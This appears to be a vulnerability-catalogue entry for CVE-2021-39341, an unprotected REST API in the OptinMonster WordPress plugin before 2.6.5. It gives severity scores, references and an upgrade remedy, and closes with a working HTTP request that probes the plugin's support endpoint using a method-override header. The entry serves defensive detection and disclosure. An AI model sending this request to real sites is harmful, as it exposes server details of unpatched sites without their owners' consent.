---
layout: post
cve_id: CVE-2021-39341
title: OptinMonster Plugin < 2.6.5 - Unprotected REST-API
pcap: true
pcap_path: /pcaps/2021/CVE-2021-39341.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2021/CVE-2021-39341.yaml
snort2_rule: N/A
snort3_rule: N/A
author: iamnoooob,pdresearch
severity: high
impact: 'Unauthenticated attackers can access sensitive system information including
  PHP version, server configuration, and plugin details via unprotected REST API endpoints.

  '
remediation: 'Upgrade to OptinMonster version 2.6.5 or later.

  '
reference:
- https://nvd.nist.gov/vuln/detail/CVE-2021-39341
- https://plugins.trac.wordpress.org/browser/optinmonster/trunk/OMAPI/RestApi.php?rev=2606519#L1460
- https://wordfence.com/vulnerability-advisories/#CVE-2021-39341
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N
  cvss-score: 8.2
  cve-id: CVE-2021-39341
  cwe-id: CWE-285,CWE-863
  epss-score: 0.44317
  epss-percentile: 0.97435
  cpe: cpe:2.3:a:optinmonster:optinmonster:*:*:*:*:*:wordpress:*:*
metadata:
  verified: true
  max-request: 1
  vendor: optinmonster
  product: optinmonster
  framework: wordpress
  publicwww-query: /wp-content/plugins/optinmonster
tags:
- cve
- cve221
- wordpress
- wp-plugin
- optinmonster
- rest-api
- disclosure
- unauth
- exposure
- vkev
- vuln
---

## ðŸ” Vulnerability Description
The OptinMonster WordPress plugin is vulnerable to sensitive information disclosure and unauthorized setting updates due to insufficient authorization validation via the logged_in_or_has_api_key function in the ~/OMAPI/RestApi.php file that can used to exploit inject malicious web scripts on sites with the plugin installed. This affects versions up to, and including, 2.6.4.


## ðŸŒ HTTP Request
```nohighlight
OPTIONS /wp-json/omapp/v1/support HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Knoppix; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36
Connection: close
Referer: https://wp.app.optinmonster.test
X-HTTP-Method-Override: GET
Accept-Encoding: gzip
```

